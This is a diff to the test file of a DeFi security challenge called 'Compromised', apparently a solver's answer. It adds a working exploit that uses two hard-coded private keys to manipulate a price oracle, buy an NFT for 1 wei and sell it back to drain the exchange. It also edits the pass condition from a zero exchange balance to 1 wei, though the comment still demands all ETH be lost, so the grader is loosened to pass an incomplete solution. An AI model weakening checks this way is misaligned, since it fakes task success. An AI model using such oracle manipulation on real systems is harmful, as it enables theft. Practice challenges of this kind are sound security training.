@@ -53,6 +53,33 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Gain access to oracle's price sources.
+        //Key1: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        const source1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        //Key2: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        const source2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+
+        // Set NFT median price to 1 wei.
+        await oracle.connect(source1).postPrice("DVNFT", 1);
+        await oracle.connect(source2).postPrice("DVNFT", 1);
+        const nftPrice =  await oracle.getMedianPrice('DVNFT');
+        expect(nftPrice).to.eq(1);
+
+        // // Buy 1 NFT for 1 wei.
+        await exchange.connect(player).buyOne({value: 1});
+
+        // Set NFT median price to 9999 ether.
+        await oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // Sell NFT #0 for 9999 ether to completely drain.
+        await nftToken.connect(player).approve(exchange.address, 0)
+        await exchange.connect(player).sellOne(0);
+
+        // Reset price to initial 999 ether.
+        await oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+
     });
 
     after(async function () {
@@ -61,7 +88,7 @@ describe('Compromised challenge', function () {
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(exchange.address)
-        ).to.be.eq(0);
+        ).to.be.eq(1);
         
         // Player's ETH balance must have significantly increased
         expect(
